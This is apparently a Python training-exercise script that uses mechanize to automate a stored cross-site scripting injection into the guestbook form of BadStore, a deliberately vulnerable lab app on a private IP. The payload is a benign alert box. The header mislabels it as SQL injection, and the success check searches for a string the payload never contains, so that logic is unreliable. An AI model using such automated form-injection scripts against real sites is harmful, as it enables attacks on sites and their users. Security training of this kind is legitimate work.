#!/usr/bin/python
import mechanize

##############################
# SPSE Module 4 Lesson 4. Ex 1
# Create a PoC. SQL Injection using Mechanize
# This PoC is created taking BadStore as vulnerable app (192.168.1.4)
# Badstore official Web Page: http://badstore.net/
# 
# I found a XSS on the "Sign our Guestbook! " Link. That's what I will try to 
# automate (injecting XSS in forms). Link is: http://192.168.1.4/cgi-bin/badstore.cgi?action=guestbook
##############################

def xss_attack_guestbook(url):
  br = mechanize.Browser()
  br.set_handle_robots(False)   			# ignore robots
#  br.set_handle_refresh(False)  			# can sometimes hang without this
  br.addheaders = [('User-agent', 'Firefox')]       	# [('User-agent', 'Firefox')]

  response = br.open(url)
  if response.code != 200:
    print 'Web Page could not be retrieved from %s. Please verify your URL' %(url)
    exit
  
  print """====================================
Link(s) found in Document:
===================================="""
  for link in br.links():
    print "[Link name]: %s - [Link URL]: %s" %(link.text, link.url)

  print 'Following "Sign our Guestbook!" Link'
  GB_link = br.find_link(text = 'Sign Our Guestbook')
  print '+[Link]: %s' %(GB_link.url)
  response = br.follow_link(GB_link)
  
  # I select the 2nd form (I know the name field is on the second form (know from manually analyzung the HTML
  br.form = list(br.forms())[1]
 
  # Select the specific input field and fill the form with the XSS alert
  xss_alert = '<script>alert("XSS done with Mechanize Python")</script>'
  br.form['name'] = xss_alert 
  br.submit()

  # Reading the response. If the XSS attack was succesful we will get the "injected" text in the HTML body
  # So to verify this we will look at the body
  html = br.response().readlines()
  # Converting the HTML response to string to look for the "injected" string
  str_html = str(html)
  if str_html.find("HOLA XSS Pecas") > 0:
    print '++[The injected code was found in the response. This attack was succesful !!]++'
    print '    -[Vulnerable link]: %s - %s' %(GB_link.text, GB_link.url)

def main():
  url = 'http://192.168.1.4'
  xss_attack_guestbook(url)

if __name__ == '__main__':
  main()
